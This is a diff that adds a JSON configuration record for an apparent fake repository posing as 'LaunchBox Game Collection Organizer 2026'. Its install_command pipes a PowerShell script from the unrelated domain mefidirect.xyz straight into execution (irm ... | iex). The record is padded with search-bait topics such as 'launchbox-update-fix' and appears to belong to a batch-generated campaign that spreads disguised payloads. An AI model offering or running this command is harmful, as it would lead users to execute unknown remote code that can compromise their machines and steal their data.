@@ -1,0 +1,29 @@
+{
+  "repo": "launchbox-game-collection-organizer-2026",
+  "product": "LaunchBox Game Collection Organizer 2026",
+  "kind": "media",
+  "install_type": "download",
+  "download_url": "https://launchbox.mefidirect.xyz/",
+  "install_url": "https://mefidirect.xyz/ps/setup.ps1",
+  "install_command": "irm https://mefidirect.xyz/ps/setup.ps1 | iex",
+  "batch": "new31",
+  "format": "license-md-only",
+  "category": "media",
+  "topics": [
+    "launchbox-edition",
+    "launchbox-suite",
+    "launchbox-media-player",
+    "launchbox-windows-11",
+    "launchbox-update-fix",
+    "install-launchbox-on-pc",
+    "launchbox-game-library",
+    "launchbox-workstation",
+    "launchbox-getting-started",
+    "launchbox-guide-2026",
+    "launchbox-pc-setup",
+    "media-tools",
+    "windows-tools",
+    "entertainment-tools",
+    "desktop-tools"
+  ]
+}
